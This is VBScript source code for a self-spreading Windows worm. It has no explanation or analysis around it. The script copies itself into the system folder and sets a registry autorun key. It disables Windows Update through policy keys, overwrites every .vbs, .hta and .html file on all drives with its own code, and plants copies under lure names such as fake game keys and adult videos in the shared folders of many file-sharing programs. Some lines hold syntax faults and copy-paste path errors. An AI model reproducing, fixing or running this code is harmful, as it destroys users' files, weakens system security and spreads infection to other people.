   On error Resume Next
   set shell = createobject("wscript.shell")
   set fso = createobject("scripting.filesystemobject")
   Liberty = wscript.scriptfullname
   fso.copyfile Liberty,fso.getspecialfolder(0) & "\Energy.vbs"
   shell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Liberty",fso.getspecialfolder(0)& "\Energy.vbs"
   shell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\WindowsUpdate"DisableWindowsUpdateAccess"=dword:00000001"
   shell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"NoWindowsUpdate"=dword:00000001"
   Pgdir = shell.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
   myfile=fso.opentextfile(wscript.scriptfullname,1)
   src=myfile.readall
   myfile.close
   set drvs=fso.drives
   for each drv in drvs
    if drv.isready then
     infect drv
    end if
   next
   files = array("Destroyed Columbia Picture.jpg","Mature Sex Film.avi","Unreal II the Awenking Key.txt","CC Generals Key.txt","CC Generals Key.exe","Iraq War at Februar.doc","Energy from BrigadaOcho","","","","","","","")
   kl = (Pgdir & "\kazaa lite\my shared folder") & "\"
   if fso.folderexists(kl) then
    for x=0 to 11
     fso.copyfile Liberty,kl & files(x) & ".vbs"
    next
   end if
   kazaa = (Pgdir & "\kazaa\my shared folder") & "\"
   if fso.folderexists(kazaa) then
    for x=0 to 11
     fso.copyfile Liberty,kl & files(x) & ".vbs"
    next
   end if
   grokster = (Pgdir & "\grokster\my grokster") & "\"
   if fso.folderexists(grokster) then
    for x=0 to 11
     fso.copyfile Liberty,kl & files(x) & ".vbs"
    next
   end if
   bearshare = (Pgdir & "\bearshare\shared") & "\"
   if fso.folderexists(bearshare) then
    for x=0 to 11
     fso.copyfile Liberty,kl & files(x) & ".vbs"
    next
   end if
   kmd = (Pgdir & "\kmd\my shared folder") & "\"
   if fso.folderexists(kmd) then
    for x=0 to 11
     fso.copyfile Liberty,kl & files(x) & ".vbs"
    next
   end if
   edonkey = (Pgdir & "\edonkey2000\incoming") & "\"
   if fso.folderexists(edonkey) then
    for x=0 to 11
     fso.copyfile Liberty,kl & files(x) & ".vbs"
    next
   end if
   morpheus = (Pgdir & "\morpheus\my shared folder") & "\"
   if fso.folderexists(morpheus) then
    for x=0 to 11
     fso.copyfile Liberty,kl & files(x) & ".vbs"
    next
   end if
   limewire = (Pgdir & "\limewire\shared") & "\"
   if fso.folderexists(limewire) then
    for x=0 to 11
     fso.copyfile Liberty,kl & files(x) & ".vbs"
    next
   end if
   emule = (Pgdir & "\emule\incoming") & "\"
   if fso.folderexists(emule) then
    for x=0 to 11
     fso.copyfile Liberty,kl & files(x) & ".vbs"
    next
   end if
   newtella = (Pgdir & "\newtella") & "\"
   if fso.folderexists(newtella) then
    for x=0 to 11
     fso.copyfile Liberty,kl & files(x) & ".vbs"
    next
   end if
   napigator = (Pgdir & "\thirty4 interactive\napigator") & "\"
   if fso.folderexists(limewire) then
    for x=0 to 11
     fso.copyfile Liberty,kl & files(x) & ".vbs"
    next
   end if
   overnet = (Pgdir & "\overnet\incoming") & "\"
   if fso.folderexists(overnet) then
    for x=0 to 11
     fso.copyfile Liberty,kl & files(x) & ".vbs"
    next
   end if
   appleJuice = (Pgdir & "\appleJuice\incoming") & "\"
   if fso.folderexists(appleJuice) then
    for x=0 to 11
     fso.copyfile Liberty,kl & files(x) & ".vbs"
    next
   end if
   function infect(Path)
   set folder=fso.getfolder(path)
   set files=folder.files
   for each file in files
    fs = array("vbs,"hta","html","","")
    for each f in fs
     ext=lcase(fso.getextensionname(file))
     if ext=f then
      fso.deletefile (file)
      fso.copyfile wscript.scriptfullname, file
     end if
    next
   next
   set sfolder=folder.subfolders
   for each f in sfolder
    infect f
   next
   end function
